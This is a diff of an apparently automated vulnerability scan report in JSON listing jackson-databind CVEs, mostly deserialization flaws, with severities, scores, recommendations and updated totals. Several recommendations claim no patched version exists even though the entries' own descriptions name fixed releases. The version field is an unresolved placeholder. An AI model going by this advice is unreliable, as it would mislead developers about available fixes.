+      "description": "jackson-databind Deserialization of Untrusted Data vulnerability. An issue was discovered in FasterXML jackson-databind prior to 2.7.9.4, 2.8.11.2, and 2.9.6. When Default Typing is enabled (either globally or for a specific property), the service has the Jodd-db jar (for database access for the Jodd framework) in the classpath, and an attacker can provide an LDAP service to access, it is possible to make the service execute a malicious payload.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No patched version is available for com.fasterxml.jackson.core:jackson-databind (CVE-2018-12022). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2019-17267",
+      "published": "2020-06-15T18:44:48Z",
+      "lastModified": "2024-03-15T05:20:35.120151Z",
+      "current_version": "${jackson.version}",
+      "description": "Improper Input Validation in jackson-databind. A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10 and 2.8.11.5. It is related to net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No patched version is available for com.fasterxml.jackson.core:jackson-databind (CVE-2019-17267). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2019-16943",
+      "published": "2019-11-13T00:32:27Z",
+      "lastModified": "2024-03-16T05:19:55.172981Z",
+      "current_version": "${jackson.version}",
+      "description": "jackson-databind polymorphic typing issue. A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.0.0 prior to 2.9.10.1, 2.8.11.5, and 2.6.7.3. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the p6spy (3.8.6) jar in the classpath, and an attacker can find an RMI service endpoint to access, it is possible to make the service execute a malicious payload. This issue exists because of com.p6spy.engine.spy.P6DataSource mishandling.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No patched version is available for com.fasterxml.jackson.core:jackson-databind (CVE-2019-16943). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2019-17531",
+      "published": "2019-11-13T00:32:38Z",
+      "lastModified": "2024-03-16T05:19:37.211801Z",
+      "current_version": "${jackson.version}",
+      "description": "jackson-databind polymorphic typing issue. A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.0.0 prior to 2.9.10.1, 2.8.11.5, and 2.6.7.3. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the apache-log4j-extra (version 1.2.x) jar in the classpath, and an attacker can provide a JNDI service to access, it is possible to make the service execute a malicious payload. ",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No patched version is available for com.fasterxml.jackson.core:jackson-databind (CVE-2019-17531). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2019-14439",
+      "published": "2019-08-01T19:18:06Z",
+      "lastModified": "2024-03-13T05:27:58.436849Z",
+      "current_version": "${jackson.version}",
+      "description": "Deserialization of untrusted data in FasterXML jackson-databind. A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x before 2.9.9.2, 2.8.11.4, 2.7.9.6, and 2.6.7.3. This occurs when Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the logback jar in the classpath.",
+      "severity": "LOW",
+      "cvss_score": 3,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "Monitor com.fasterxml.jackson.core:jackson-databind (CVE-2019-14439) for updates and upgrade when a fix becomes available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2019-14540",
+      "published": "2019-09-23T18:33:25Z",
+      "lastModified": "2026-02-04T02:19:17.186100Z",
+      "current_version": "${jackson.version}",
+      "description": "Polymorphic Typing issue in FasterXML jackson-databind. A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10, 2.8.11.5, and 2.6.7.3. It is related to `com.zaxxer.hikari.HikariConfig`.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No patched version is available for com.fasterxml.jackson.core:jackson-databind (CVE-2019-14540). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2017-7525",
+      "published": "2018-10-16T17:21:35Z",
+      "lastModified": "2024-03-11T05:19:49.080060Z",
+      "current_version": "${jackson.version}",
+      "description": "jackson-databind is vulnerable to a deserialization flaw. A deserialization flaw was discovered in the jackson-databind, versions before 2.6.7.1, 2.7.9.1 and 2.8.9, which could allow an unauthenticated user to perform code execution by sending the maliciously crafted input to the readValue method of the ObjectMapper.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No patched version is available for com.fasterxml.jackson.core:jackson-databind (CVE-2017-7525). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2017-17485",
+      "published": "2018-10-18T17:42:48Z",
+      "lastModified": "2024-03-11T05:17:47.425595Z",
+      "current_version": "${jackson.version}",
+      "description": "jackson-databind vulnerable to remote code execution due to incorrect deserialization and blocklist bypass. FasterXML jackson-databind through 2.8.10 and 2.9.x through 2.9.3 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw. This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the Spring libraries are available in the classpath.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No patched version is available for com.fasterxml.jackson.core:jackson-databind (CVE-2017-17485). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2022-42004",
+      "published": "2022-10-03T00:00:31Z",
+      "lastModified": "2026-02-04T02:40:22.352009Z",
+      "current_version": "${jackson.version}",
+      "description": "Uncontrolled Resource Consumption in FasterXML jackson-databind. In FasterXML jackson-databind before 2.12.7.1 and in 2.13.x before 2.13.4, resource exhaustion can occur because of a lack of a check in BeanDeserializer._deserializeFromArray to prevent use of deeply nested arrays. This issue can only happen when the `UNWRAP_SINGLE_VALUE_ARRAYS` feature is explicitly enabled.",
+      "severity": "MEDIUM",
+      "cvss_score": 4,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No fixed version for com.fasterxml.jackson.core:jackson-databind (CVE-2022-42004). Limit exposure, avoid vulnerable functionality, and monitor for updates.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2020-10650",
+      "published": "2022-07-15T19:41:47Z",
+      "lastModified": "2026-03-13T22:01:03.241551Z",
+      "current_version": "${jackson.version}",
+      "description": "jackson-databind vulnerable to unsafe deserialization. The com.fasterxml.jackson.core:jackson-databind library before version 2.9.10.4 is vulnerable to an Unsafe Deserialization vulnerability when handling interactions related to the class `ignite-jta`.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No patched version is available for com.fasterxml.jackson.core:jackson-databind (CVE-2020-10650). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2020-36189",
+      "published": "2021-12-09T19:16:59Z",
+      "lastModified": "2024-02-18T05:24:26.785781Z",
+      "current_version": "${jackson.version}",
+      "description": "Unsafe Deserialization in jackson-databind. FasterXML jackson-databind 2.x before 2.9.10.8 an 2.6.7.5 mishandles the interaction between serialization gadgets and typing, related to com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No patched version is available for com.fasterxml.jackson.core:jackson-databind (CVE-2020-36189). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2018-5968",
+      "published": "2020-06-30T20:40:50Z",
+      "lastModified": "2024-03-11T05:18:22.727055Z",
+      "current_version": "${jackson.version}",
+      "description": "Deserialization of Untrusted Data in jackson-databind. FasterXML jackson-databind through 2.8.11 and 2.9.x through 2.9.3 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 and CVE-2017-17485 deserialization flaws. This is exploitable via two different gadgets that bypass a blacklist.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No patched version is available for com.fasterxml.jackson.core:jackson-databind (CVE-2018-5968). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
     {
       "cve_id": "CVE-2024-47081",
       "published": "2025-06-09T19:06:08Z",
@@ -409,12 +1365,12 @@
     }
   ],
   "statistics": {
-    "Total": 30,
-    "Critical": 4,
-    "High": 0,
-    "Medium": 9,
-    "Low": 17
+    "Total": 92,
+    "Critical": 25,
+    "High": 8,
+    "Medium": 27,
+    "Low": 32
   },
-  "total_deps": 3,
-  "scan_date": "2026-05-04 17:08:14"
+  "total_deps": 39,
+  "scan_date": "2026-05-05 01:43:15"
 }
